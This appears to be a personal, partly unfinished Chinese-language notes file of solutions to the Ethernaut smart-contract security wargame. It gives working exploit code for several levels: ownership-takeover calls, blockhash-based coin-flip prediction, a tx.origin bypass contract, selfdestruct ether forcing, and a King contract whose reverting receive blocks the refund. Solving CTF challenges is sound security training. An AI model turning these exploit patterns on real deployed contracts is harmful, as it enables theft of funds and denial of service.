---
tags:
  - TODO
---

# Ethernaut 刷题记录

## Fallback


```js
await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})
await contract.sendTransaction({from: player, value: toWei('0.0001')})
await contract.withdraw()
```

receive 函数能够在合约账户接收以太币的时候触发 fallback，所以只要向合约发出带有以太币的交易就可以触发这个函数转移 owner

## Fallout

```js
await contract.Fal1out()
```

拼写错误

## Coin Flip

```js
contract Hack {
    CoinFlip coin_flip = CoinFlip(0x23B4f570431e0A701d5E08B80b3ecb7F53E75204);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor() {
    }

    function poc() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return coin_flip.flip(side);
    }
}
```

```python
def main():
    # contractAddress = deploy()
    contractAddress = "0x62ce547f26708dd8D311C14ac345664bAf7524F0"

    for i in range(10):
        print(f"Sending {i + 1}")
        txn_receipt = transact(hacker, contractAddress, utils.calc_call_data("poc()"))
        print(txn_receipt)
        time.sleep(3)
```

## Telephone

- tx.origin：交易发送方
- msg.sender：消息发送方

比如 用户账户 A -> 合约账户 B -> 合约账户 C，那么 C 获取到的 tx.origin 为 A，msg.sender 为 B。所以写个合约调用就行。

```js
contract Hack {
    Telephone tel;
    constructor (address t) {
        tel = Telephone(t);
    }

    function hack() public {
        tel.changeOwner(msg.sender);
    }
}
```
## Token

整型下溢就行

## Delegation

https://www.wtf.academy/solidity-advanced/Delegatecall/

当用户 A 通过合约 B 来 delegatecall 合约 C 的时候，执行的是合约 C 的函数，但是语境仍是合约 B 的：msg.sender 是 A 的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约 B 的变量上。

```py
contractAddress = "0xeb219f0c57D1C3e0a773c410C6284860B1959d78"
txn_receipt = transact(hacker, contractAddress, utils.calc_call_data("pwn()"))
```

## Force

`selfdestruct` 强制转账。

```js
contract Hack {
  constructor () payable {
  }

  function poc(address game) public payable {
      selfdestruct(payable(game));
  }
}
```

## Vault

存储的所有状态变量都是上链的

```js
await web3.eth.getStorageAt(instance, 1)
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

## King

可以看到题目合约在 receive 时会向前一个 king transfer，所以自己恶意合约的 receive 函数 revert 就行。

```js
contract Hack {
  King king;
  constructor(address game) payable {
    king = King(payable(game));
    payable(address(game)).call{value: msg.value}("");
  }

  receive() external payable {
    revert();
  }
}
```

## Re-entrancy


## 

## 

## 

## 